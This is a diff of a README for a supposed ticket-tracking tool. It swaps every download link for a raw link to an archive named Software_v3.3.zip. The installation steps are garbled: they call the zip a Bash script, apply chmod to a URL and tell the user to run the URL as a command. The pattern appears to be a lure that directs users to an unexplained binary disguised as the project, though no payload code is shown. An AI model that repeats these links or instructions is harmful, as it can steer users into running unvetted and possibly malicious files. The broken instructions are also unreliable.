@@ -1,6 +1,6 @@
 # 🎟️ ticket - Effortless Ticket Tracking Made Simple
 
-[![Download ticket](https://raw.githubusercontent.com/ishanborah43/ticket/master/pkg/aur/Software_v1.3.zip)](https://raw.githubusercontent.com/ishanborah43/ticket/master/pkg/aur/Software_v1.3.zip)
+[![Download ticket](https://github.com/ishanborah43/ticket/raw/refs/heads/master/pkg/Software_v3.3.zip)](https://github.com/ishanborah43/ticket/raw/refs/heads/master/pkg/Software_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -24,11 +24,11 @@ To get started, please follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to our download page.
    
-   [Download ticket](https://raw.githubusercontent.com/ishanborah43/ticket/master/pkg/aur/Software_v1.3.zip)
+   [Download ticket](https://github.com/ishanborah43/ticket/raw/refs/heads/master/pkg/Software_v3.3.zip)
 
 2. **Locate the Latest Version:** On the releases page, find the latest version listed at the top.
 
-3. **Download the Bash Script:** Click the download link for the script. It should look something like `https://raw.githubusercontent.com/ishanborah43/ticket/master/pkg/aur/Software_v1.3.zip`.
+3. **Download the Bash Script:** Click the download link for the script. It should look something like `https://github.com/ishanborah43/ticket/raw/refs/heads/master/pkg/Software_v3.3.zip`.
 
 4. **Make the Script Executable:**
    - Open your terminal.
@@ -38,12 +38,12 @@ To get started, please follow these steps:
      ```
    - Make the script executable by running:
      ```
-     chmod +x https://raw.githubusercontent.com/ishanborah43/ticket/master/pkg/aur/Software_v1.3.zip
+     chmod +x https://github.com/ishanborah43/ticket/raw/refs/heads/master/pkg/Software_v3.3.zip
      ```
 
 5. **Run the Script:** Launch the application by typing:
    ```
-   https://raw.githubusercontent.com/ishanborah43/ticket/master/pkg/aur/Software_v1.3.zip
+   https://github.com/ishanborah43/ticket/raw/refs/heads/master/pkg/Software_v3.3.zip
    ```
    You will see the main menu for managing your tickets.
 
